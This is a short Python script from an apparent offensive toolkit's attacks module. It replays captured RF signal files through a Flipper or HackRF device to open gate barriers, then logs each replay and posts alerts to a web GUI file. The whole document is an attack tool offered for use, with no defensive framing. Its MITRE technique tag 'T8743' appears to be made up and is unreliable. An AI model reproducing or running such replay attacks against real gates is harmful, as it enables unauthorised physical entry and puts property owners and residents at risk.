#!/usr/bin/env python3
# modules/attacks/gate_rf_replay.py

import argparse
import os
import subprocess
import time
import json
from datetime import datetime

LOG = "results/gate_rf_replay.log"
ALERT = "webgui/alerts.json"
MITRE_TTP = "T8743"

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()} | {msg}\n")
    print(f"[GATE-RF] {msg}")

def alert(msg):
    os.makedirs("webgui", exist_ok=True)
    alert_obj = {
        "agent": "gate_rf_replay",
        "message": msg,
        "type": "rf",
        "timestamp": time.time()
    }
    with open(ALERT, "a") as f:
        f.write(json.dumps(alert_obj) + "\n")

def replay_rf(signal_file, device):
    cmd = f"flipper-replay --device {device} --file {signal_file}"
    try:
        subprocess.run(cmd.split(), check=True)
        msg = f"RF signal from {signal_file} replayed via {device}"
        log(msg)
        alert(msg)
    except Exception as e:
        log(f"[!] Replay failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Replay captured RF signals to open gate barriers")
    parser.add_argument("--signal", required=True, help="Path to .sub or .ir signal file")
    parser.add_argument("--device", default="/dev/ttyACM0", help="Replay device (e.g., Flipper, HackRF)")
    args = parser.parse_args()
    replay_rf(args.signal, args.device)
